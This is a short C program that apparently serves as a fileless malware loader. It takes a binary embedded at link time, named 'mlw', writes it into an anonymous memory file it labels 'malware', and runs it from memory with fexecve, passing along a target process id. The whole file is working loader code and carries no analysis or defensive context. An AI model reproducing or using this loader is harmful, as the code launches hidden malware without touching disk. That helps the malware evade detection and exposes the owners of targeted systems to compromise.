#include <stdio.h>
#include <syscall.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

extern const unsigned char _binary_mlw_start[];
extern const unsigned char _binary_mlw_end[];

int
main(int argc, char *argv[])
{
	if (argc < 2) {
		printf("need pid\n");
		return 1;
	}

	printf("pid: %s\n", argv[1]);

	int file;
	file = syscall(SYS_memfd_create, "malware", 0);
	if (file == -1) {
		printf("failed to create a memory file, err: %s\n", strerror(errno));
		return 1;
	}

	size_t size;
	size = _binary_mlw_end - _binary_mlw_start;

	ssize_t bytes;
	bytes = write(file, _binary_mlw_start, size);
	if (bytes == -1) {
		printf("failed to append the binary, err: %s\n", strerror(errno));
		return 1;
	}

	int res;

	char *args[] = { "", argv[1], NULL };
	char *envp[] = { NULL };
	res = fexecve(file, args, envp);
	if (res == -1) {
		printf("failed to load the malware, err: %s\n", strerror(errno));
		return 1;
	}

	return 0;
}
